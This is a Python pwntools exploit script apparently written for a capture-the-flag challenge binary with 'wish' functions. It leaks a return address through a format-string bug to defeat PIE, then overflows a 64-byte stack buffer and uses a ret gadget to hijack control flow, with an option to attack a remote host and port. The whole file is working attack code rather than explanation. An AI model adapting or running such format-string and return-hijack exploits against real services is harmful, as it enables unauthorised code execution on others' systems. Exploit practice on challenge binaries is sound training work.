#!/usr/bin/env python3
from pwn import *
from capstone import Cs, CS_ARCH_X86, CS_MODE_64

context.arch = 'amd64'
context.log_level = 'info'

BINARY = './dist/chall'   # <-- point this at your real deployed binary (e.g. dist/chall)
elf = ELF(BINARY, checksec=False)

WISH_FUNCS = {
    'money':      elf.symbols['i_wish_for_prosperity'],
    'longevity':  elf.symbols['i_wish_for_longevity'],
    'wise_mind':  elf.symbols['i_wish_for_wisdom'],
    'love':       elf.symbols['i_wish_for_affection'],
    'food':       elf.symbols['i_wish_for_nourishment'],
}

OVERFLOW_PAD = 64                # size of `choice` buffer
SAVED_RBP_PAD = 8                # 8 junk bytes to cover saved RBP

MAX_CALIBRATION_INDEX = 50       # how many %N$p slots to try while calibrating


def find_return_after_call(elf_obj, caller_name, callee_name):
    func = elf_obj.functions[caller_name]
    callee_addr = elf_obj.symbols[callee_name]
    data = elf_obj.read(func.address, func.size)

    md = Cs(CS_ARCH_X86, CS_MODE_64)
    for insn in md.disasm(data, func.address):
        if insn.mnemonic == 'call':
            try:
                target = int(insn.op_str, 16)
            except ValueError:
                continue
            if target == callee_addr:
                return insn.address + insn.size
    raise Exception(f"couldn't find `call {callee_name}` inside {caller_name}")


RET_LEAK_CODE_OFFSET = find_return_after_call(elf, 'main', 'reveal_fate')
log.info(f"computed return-address offset (main -> reveal_fate) = {hex(RET_LEAK_CODE_OFFSET)}")


def find_ret_gadget(elf_obj):
    text = elf_obj.get_section_by_name('.text')
    data = text.data()
    base_addr = text['sh_addr']

    md = Cs(CS_ARCH_X86, CS_MODE_64)
    for insn in md.disasm(data, base_addr):
        if insn.mnemonic == 'ret' and insn.op_str == '':
            return insn.address
    raise Exception("couldn't find a bare `ret` gadget in .text")


RET_GADGET_OFFSET = find_ret_gadget(elf)
log.info(f"stack-alignment ret gadget offset = {hex(RET_GADGET_OFFSET)}")


def start():
    if args.REMOTE:
        host = args.HOST or '127.0.0.1'
        port = int(args.PORT or 1337)
        return remote(host, port)
    return process(BINARY)


def try_leak(io_factory, fmt_index):
    io = io_factory()
    io.recvuntil(b'wish to start over? ')
    io.sendline(f"%{fmt_index}$p".encode())
    line = io.recvline().strip()

    try:
        leaked = int(line, 16)
    except ValueError:
        return io, None

    base = leaked - RET_LEAK_CODE_OFFSET
    if base & 0xfff == 0 and 0x100000000000 <= base < 0x800000000000:
        return io, base
    return io, None


def leak_pie_base():
    for idx in range(1, MAX_CALIBRATION_INDEX + 1):
        io, base = try_leak(start, idx)
        if base is not None:
            log.success(f"calibrated: %{idx}$p leaks the return address")
            log.success(f"PIE base = {hex(base)}")
            return io, base
        io.close()
    raise Exception(
        
    )

def trigger_wish(io, base, wish):
    target = base + WISH_FUNCS[wish]
    ret_gadget = base + RET_GADGET_OFFSET
    log.success(f"targeting i_wish_for_* @ {hex(target)} ({wish})")

    payload = b'A' * OVERFLOW_PAD          # fill choice[64]
    payload += b'B' * SAVED_RBP_PAD        # overwrite saved RBP (don't care)
    payload += p64(ret_gadget)             # alignment fixup: rsp += 8
    payload += p64(target)                 # actual hijack target

    io.recvuntil(b'Input : ')
    io.sendline(payload)


def main():
    wish = args.WISH or 'wise_mind'   # pass WISH=money etc on the cmdline
    if wish not in WISH_FUNCS:
        log.error(f"unknown wish {wish!r}, pick one of {list(WISH_FUNCS)}")

    io, base = leak_pie_base()
    trigger_wish(io, base, wish)

    io.stream()


if __name__ == '__main__':
    main()